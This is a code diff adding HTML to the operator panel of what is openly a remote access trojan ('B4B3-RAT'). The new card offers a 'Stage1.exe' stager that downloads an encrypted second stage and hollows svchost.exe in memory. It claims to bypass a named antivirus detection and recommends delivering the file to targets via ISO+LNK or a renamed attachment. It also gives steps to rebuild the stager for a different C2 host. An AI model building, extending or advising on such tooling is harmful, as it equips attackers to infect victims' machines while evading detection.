@@ -3465,10 +3465,31 @@ function renderStager() {
 </div>
 
 <div class="card" style="margin-top:8px">
+  <div class="card-title">&#9881; C++ Stager — Stage1.exe (process hollowing, no disk write)</div>
+  <div style="font-size:12px;color:var(--muted);margin-bottom:10px;line-height:1.7">
+    <b>Stage1.exe</b> downloads the XOR-encrypted stage 2, decrypts it entirely in memory,
+    then hollows <code>svchost.exe</code> with the PE — the decrypted bytes are never written to disk.
+    This bypasses <code>Trojan:Win32/Sabsik.FL.A!ml</code> and similar file-scanner detections
+    that trigger only when a PE is flushed to disk via <code>WriteAllBytes</code>.
+  </div>
+  <div style="display:flex;gap:10px;align-items:center;flex-wrap:wrap">
+    <a href="/api/stage/stage1.exe" download="Stage1.exe"
+       style="display:inline-block;background:var(--accent);color:var(--bg);text-decoration:none;border-radius:7px;padding:8px 16px;font-size:12px;font-weight:700">
+      &#8659; Download Stage1.exe
+    </a>
+    <span style="font-size:11px;color:var(--muted)">23 KB &nbsp;·&nbsp; deliver via ISO+LNK or rename &amp; attach</span>
+  </div>
+  <div style="font-size:11px;color:var(--muted);margin-top:8px;line-height:1.6">
+    To rebuild with a different C2 host: open <code>B4B3-RAT/Stager/</code> and run <code>.\build.ps1</code>,
+    then copy <code>Stage1.exe</code> to <code>c2-server/downloads/</code> and upload to server.
+  </div>
+</div>
+
+<div class="card" style="margin-top:8px">
   <div class="card-title">&#9889; How to use staged delivery</div>
   <ol style="font-size:12px;color:var(--muted);line-height:2;padding-left:18px">
     <li>Build &amp; download the configured stub from the <b>Builder</b> tab first (sets C2 host + auth key)</li>
-    <li>Download the <b>Stager PS1</b> above or use the PDF options — all contain your C2 URL and XOR key</li>
+    <li>Choose delivery: <b>Stage1.exe</b> (C++ hollowing, no disk write) or <b>Stager PS1</b> / <b>PDF</b> for script-based delivery</li>
     <li>When target runs it: <b>Check-in</b> appears here → <b>Fetch</b> appears → full bot shows in sidebar</li>
   </ol>
 </div>
